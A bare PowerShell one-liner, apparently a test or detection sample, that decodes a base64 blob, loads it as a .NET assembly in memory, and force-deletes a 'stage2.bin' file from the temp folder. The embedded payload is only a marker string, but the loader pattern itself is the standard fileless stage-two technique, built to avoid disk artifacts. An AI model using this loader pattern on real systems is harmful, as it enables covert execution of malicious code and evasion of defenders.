
$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo3ZG1qejBnZzNi"); $TransferResult = [Reflection.Assembly]::Load($PayloadBytes); $TransferResult.GetTypes().Count; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
